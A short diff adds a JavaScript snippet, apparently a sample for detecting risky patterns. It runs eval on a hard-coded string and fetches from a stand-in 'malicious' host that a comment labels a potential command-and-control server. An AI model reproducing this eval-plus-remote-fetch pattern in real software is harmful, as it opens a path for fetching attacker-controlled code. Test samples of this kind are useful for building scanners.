@@ -1,0 +1,7 @@
+// Dynamic Code Generation Example
+
+var dynamicCode = "console.log('Hello from dynamic code')";
+eval(dynamicCode); // Executes dynamic code
+
+var url = "http://malicious.example.com";
+fetch(url).then(response => response.text()).then(data => console.log(data)); // Potential C&C server
